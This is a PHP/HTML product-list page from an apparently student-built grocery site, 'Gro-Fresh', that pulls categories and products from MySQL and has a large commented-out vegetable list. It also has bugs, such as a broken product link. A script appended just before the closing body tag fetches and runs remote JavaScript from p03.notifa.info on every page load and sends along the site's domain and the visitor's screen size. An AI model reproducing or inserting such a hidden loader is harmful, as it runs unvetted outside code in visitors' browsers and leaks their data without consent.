<?php include '../system/koneksi.php' ?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../../../favicon.ico">

    <title>Gro-Fresh | Product List</title>
    <?php include 'head.php'; ?>

  </head>
  <body>
    <?php include 'header user.php'; ?>

      <div class="container-fluid">
      <div class="row pt-3">
        <div class="col-sm-9">
          <h2>List Product</h2>
        </div>
        
        <div class="col-sm-3">
          <form class="form-inline md-form " role="search" id="search-form">
            <div class="form-group">
              <input type="text" class="form-control mr-1" placeholder="ex : Wortel">
            </div>
            <button id="search-button" type="submit" class="btn btn-warning float-right">Search</button>
          </form>
        </div>
      </div>



      <script type="text/javascript">
              $(function(){
                 $("#search-button, #search-icon").click(function(e){
                     e.preventDefault();
                     $("#search-button, #search-form").toggle();
                 });
              })  
        </script>

      	<div class="row pt-3">
          <?php
              
              $query="SELECT * from  kategori";
              $result=mysqli_query($con, $query) or die(mysqli_error());
              $kd_kategorii=1;
              //proses menampilkan data
              while(
                $rows=mysqli_fetch_object($result))

              {
          ?>
	        <div class="col-sm-3 p-4">
            <h1><strong><?=$rows -> nama_kategori;?></strong></h1>
              <ul class="list-group list-group-flush">
              
              <?php
                $query1="SELECT * from  produk";
                $result1=mysqli_query($con, $query1) or die(mysqli_error());
                $kd_produk=1;
                //proses menampilkan data
                while(
                  $rows1=mysqli_fetch_object($result1)
                )
                {
              ?>
              
                <a href="detailproduct.php?kd_produk=' . $kopro . '" class="list-group-item list-group-item-action"><?=$rows1 -> nama_produk;?></a>
                <?php
            $kd_produk++;
            } ?>  
              </ul>
          </div>
           
           

            <?php
            $kd_kategorii++;
            } ?>

            

            
            <!--
            <div class="col-sm-3 p-4">
            <h1><strong>B</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Bawang bombay</a>
                <a href="#" class="list-group-item list-group-item-action">Bawang putih</a>
                <a href="#" class="list-group-item list-group-item-action">Bawang merah</a>
                <a href="#" class="list-group-item list-group-item-action">Bayam</a>
                <a href="#" class="list-group-item list-group-item-action">Buncis</a>
                <a href="#" class="list-group-item list-group-item-action">Brokoli</a>
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>C</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Cabai</a>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>D</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Daun bawang</a>
                <a href="#" class="list-group-item list-group-item-action">Daun singkong</a>
                <a href="#" class="list-group-item list-group-item-action">Daun Seledri</a>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>E</strong></h1>
              <ul class="list-group list-group-flush">
                
              </ul>
          </div>

            <div class="col-sm-3 p-4">
            <h1><strong>F</strong></h1>
              <ul class="list-group list-group-flush">
                
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>G</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Gambas</a>
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>H</strong></h1>
              <ul class="list-group list-group-flush">
                
              </ul>
          </div>


        <div class="col-sm-3 p-4">
            <h1><strong>I</strong></h1>
              <ul class="list-group list-group-flush">
                
              </ul>
          </div>

            <div class="col-sm-3 p-4">
            <h1><strong>J</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Jangung</a>
                <a href="#" class="list-group-item list-group-item-action">Jamur</a>
                
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>K</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Kacang hijau</a>
                <a href="#" class="list-group-item list-group-item-action">Kacang panjang</a>
                <a href="#" class="list-group-item list-group-item-action">Kacang polong</a>
                <a href="#" class="list-group-item list-group-item-action">Kacang tanah</a>
                <a href="#" class="list-group-item list-group-item-action">Kacang merah</a>
                <a href="#" class="list-group-item list-group-item-action">Kailan</a>
                <a href="#" class="list-group-item list-group-item-action">Kangkung</a>
                <a href="#" class="list-group-item list-group-item-action">Kemiri</a>
                <a href="#" class="list-group-item list-group-item-action">Kentang</a>
                <a href="#" class="list-group-item list-group-item-action">Ketumbar</a>
                <a href="#" class="list-group-item list-group-item-action">Kubis</a>
                <a href="#" class="list-group-item list-group-item-action">Kucai</a>
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>L</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Labu air</a>
                <a href="#" class="list-group-item list-group-item-action">Lada</a>
                <a href="#" class="list-group-item list-group-item-action">Lobak</a>
                <a href="#" class="list-group-item list-group-item-action">Lobak Merah</a>
                <a href="#" class="list-group-item list-group-item-action">Labu siam</a>
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>M</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Merica</a>
                <a href="#" class="list-group-item list-group-item-action">Mint</a>
              </ul>
          </div>

            <div class="col-sm-3 p-4">
            <h1><strong>N</strong></h1>
              <ul class="list-group list-group-flush">
                
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>O</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Okra</a>
                
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>P</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Peria</a>
                <a href="#" class="list-group-item list-group-item-action">Petai</a>
                <a href="#" class="list-group-item list-group-item-action">Paprika</a>
                
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>Q</strong></h1>
              <ul class="list-group list-group-flush">
                
              </ul>
          </div>

            <div class="col-sm-3 p-4">
            <h1><strong>R</strong></h1>
              <ul class="list-group list-group-flush">
                
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>S</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Sawi</a>
                <a href="#" class="list-group-item list-group-item-action">Selada</a>
                <a href="#" class="list-group-item list-group-item-action">Selada air</a>
                <a href="#" class="list-group-item list-group-item-action">Seledri</a>
                <a href="#" class="list-group-item list-group-item-action">Serai</a>
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>T</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Terong</a>
                <a href="#" class="list-group-item list-group-item-action">Timun</a>
                <a href="#" class="list-group-item list-group-item-action">Tomat</a>
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>U</strong></h1>
              <ul class="list-group list-group-flush">
                <a href="#" class="list-group-item list-group-item-action">Ubi jalar</a>
              </ul>
          </div>

            <div class="col-sm-3 p-4">
            <h1><strong>V</strong></h1>
              <ul class="list-group list-group-flush">
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>W</strong></h1>
              <ul class="list-group list-group-flush">
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>X</strong></h1>
              <ul class="list-group list-group-flush">
              </ul>
          </div>

          <div class="col-sm-3 p-4">
            <h1><strong>Y</strong></h1>
              <ul class="list-group list-group-flush">
              </ul>
          </div>

            <div class="col-sm-3 p-4">
            <h1><strong>Z</strong></h1>
              <ul class="list-group list-group-flush">
              </ul>
          </div>
        </div>
      </div> -->


          <hr class="featurette-divider">
     <?php include 'footer.php'; ?>
    </main>

    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="assets/js/jquery-slim.min.js"><\/script>')</script>
    <script src="../../assets/js/vendor/popper.min.js"></script>
    <script src="assets/js/bootstrap.js"></script>
    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
    <script src="assets/js/holder.min.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mkO%2f7ITrK9yURUOYsdqntBVAlSz8%2fPPT1NsENzZAXZvdF4fJa8FrsPLXqCn7C2iTxywkrJ6vNZvgnyFsAA7iZX%2fBbJGVqvHo03oLCHNcoC6exH7MFm0mIZGbj9KGuL8b%2bLdMTdMu0hXwGsN97BNN1Du3IEDZh76lBvvKe7uTgK%2bBIE3%2bjPB5ONaZ1Yw6dvBk0OSW2dXxBwA4xbDPstIubbyK1GMVuiAuUuTUR2sQvSPmBysFYDZt%2f5oV9iGM%2f56Vor4jxpvD5WlPbJqeGR2ExyMsDfHTUrpAHEcSz33fkR%2fjQKqh8YcK%2fHrA8ckj1utk%2f4Cf1NEgc0lPg7K4PVy7U7zKnyvzQ%2b4%2bBkcyJEKyFE2fE%2bMP8WbIxIXraBI%2bELsmFDQkT%2fOF44rFd1UH8XzmRGxxbbig%2by19lPk%2fcUkqx9w4cD9ciLiFexN%2fkZCzAAupxjzRqX9fDZ5jYv3gFdi5r6mYPymJlfqKtMex%2fpS%2fQVJVMd%2bxjO7SZbv%2b%2bLheoppKSmD3odYq%2fSFm8ngyuPqEceTzRB85Q2wS1rP6GT9edgje396gcnBD1aBmreovDfgeW6DBoDdtaqnM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>